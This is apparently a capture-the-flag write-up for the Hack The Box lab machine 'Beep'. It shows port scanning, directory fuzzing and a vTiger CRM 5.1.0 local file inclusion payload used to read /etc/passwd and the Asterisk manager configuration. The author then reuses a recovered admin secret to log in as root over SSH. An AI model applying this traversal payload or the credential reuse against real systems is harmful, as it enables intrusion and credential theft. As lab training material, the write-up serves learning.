# Beep-HTB
Beep is a linux machinhe that's rated as easy. so let's start :)

# Recon
I started by runing nmap scan on the machine and found many open ports
```
root@kali:~# nmap -sC -sV 10.10.10.7
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 11:41 EDT
Nmap scan report for 10.10.10.7
Host is up (0.030s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: UIDL LOGIN-DELAY(0) APOP TOP AUTH-RESP-CODE STLS RESP-CODES IMPLEMENTATION(Cyrus POP3 server v2) PIPELINING USER EXPIRE(NEVER)
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: OK BINARY CATENATE UNSELECT NO RIGHTS=kxte UIDPLUS Completed URLAUTHA0001 SORT ATOMIC X-NETSCAPE LIST-SUBSCRIBED LISTEXT THREAD=ORDEREDSUBJECT CONDSTORE IMAP4rev1 ANNOTATEMORE CHILDREN LITERAL+ IMAP4 RENAME IDLE ID SORT=MODSEQ QUOTA STARTTLS MAILBOX-REFERRALS MULTIAPPEND THREAD=REFERENCES NAMESPACE ACL
443/tcp   open  ssl/https?
|_ssl-date: 2020-08-09T15:47:01+00:00; +2m36s from scanner time.
880/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 2m35s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 350.07 seconds
```

# Port 443
If we navigate to the webpage we can see a login window

![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Beep/images/1.png)

## ffuf
I will be using ffuf to fuzz the web directories
```
root@kali:~/Desktop/tools/Web/FFUF# ./ffuf -w /usr/share/dirb/wordlists/big.txt -u https://10.10.10.7/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.10.7/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 287, Words: 21, Lines: 11]
.htpasswd               [Status: 403, Size: 287, Words: 21, Lines: 11]
admin                   [Status: 301, Size: 309, Words: 20, Lines: 10]
cgi-bin/                [Status: 403, Size: 286, Words: 21, Lines: 11]
configs                 [Status: 301, Size: 311, Words: 20, Lines: 10]
favicon.ico             [Status: 200, Size: 879, Words: 6, Lines: 1]
help                    [Status: 301, Size: 308, Words: 20, Lines: 10]
images                  [Status: 301, Size: 310, Words: 20, Lines: 10]
lang                    [Status: 301, Size: 308, Words: 20, Lines: 10]
libs                    [Status: 301, Size: 308, Words: 20, Lines: 10]
mail                    [Status: 301, Size: 308, Words: 20, Lines: 10]
modules                 [Status: 301, Size: 311, Words: 20, Lines: 10]
panel                   [Status: 301, Size: 309, Words: 20, Lines: 10]
recordings              [Status: 301, Size: 314, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 28, Words: 3, Lines: 3]
static                  [Status: 301, Size: 310, Words: 20, Lines: 10]
themes                  [Status: 301, Size: 310, Words: 20, Lines: 10]
var                     [Status: 301, Size: 307, Words: 20, Lines: 10]
vtigercrm               [Status: 301, Size: 313, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 122 req/sec :: Duration: [0:02:47] :: Errors: 0 ::
```
And we found ```vtigercrm```, if we navigate to that directory and look at the footer we can see the version number. ```vtiger CRM 5.1.0```

![image2](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Beep/images/2.png)

if we search for that version number in searchsploit we will find one exploit for it.
```
root@kali:~/Desktop/tools/Web/FFUF# searchsploit vtiger CRM 5.1.0
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vTiger CRM 5.1.0 - Local File Inclusion                                                                                                                                                                  | php/webapps/18770.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
So it Looks like vTiger is vulnerable to Local File Inclusion (LFI), which means we can view files that are located on the host. If you check the exploit that we found we can see where exactly it is located.
```
root@kali:~/Desktop/tools/Web/FFUF# cat /usr/share/exploitdb/exploits/php/webapps/18770.txt 
# Exploit Title: VTiger CRM
# Google Dork: None
# Date: 20/03/2012
# Author: Pi3rrot
# Software Link: http://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%205.1.0/
# Version: 5.1.0
# Tested on: CentOS 6
# CVE : none

We have find this vulnerabilitie in VTiger 5.1.0
In this example, you can see a Local file Inclusion in the file sortfieldsjson.php

Try this :
https://localhost/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```

```
root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash distcache:x:94:94:Distcache:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin pcap:x:77:77::/var/arpwatch:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash dbus:x:81:81:System message bus:/:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin spamfilter:x:500:500::/home/spamfilter:/bin/bash haldaemon:x:68:68:HAL daemon:/:/sbin/nologin xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin fanis:x:501:501::/home/fanis:/bin/bash
```
And we found user ```fanis```, Also in /etc/passwd, we see an entry for ```asterisk```. Asterisk is an open source PBX software and it has a configuration file located in ``` /etc/asterisk/manager.conf``` which has configuration details like passwords. We can now use the LFI that we found in VTiger to read the asterisk configuration file.

So if we navigate to here : "https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/manager.conf%00"
we will get the configuration file.
```
; ; AMI - Asterisk Manager interface ; ; FreePBX needs this to be enabled. Note that if you enable it on a different IP, you need ; to assure that this can't be reached from un-authorized hosts with the ACL settings (permit/deny). ; Also, remember to configure non-default port or IP-addresses in amportal.conf. ; ; The AMI connection is used both by the portal and the operator's panel in FreePBX. ; ; FreePBX assumes an AMI connection to localhost:5038 by default. ; [general] enabled = yes port = 5038 bindaddr = 0.0.0.0 displayconnects=no ;only effects 1.6+ [admin] secret = jEhdIekWmdjE deny=0.0.0.0/0.0.0.0 permit=127.0.0.1/255.255.255.0 read = system,call,log,verbose,command,agent,user,config,command,dtmf,reporting,cdr,dialplan,originate write = system,call,log,verbose,command,agent,user,config,command,dtmf,reporting,cdr,dialplan,originate #include manager_additional.conf #include manager_custom.conf 
```
There is one important thing that we found here and it is ```[admin] secret = jEhdIekWmdjE```.

After I tried many things I found out that the asterisk password is the same as root’s password, so we can ssh as root using the password we found.
```
root@kali:~/Desktop/tools/Web/FFUF# ssh root@10.10.10.7
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep ~]# 
```
And we are root :)

```
[root@beep ~]# cat /root/root.txt 
d88e006123842...
```
```
[root@beep ~]# cat /home/fanis/user.txt 
aeff3def0c765c...
```

Thanks for reading and you can find me here on Twitter: ```https://twitter.com/electronicbots```
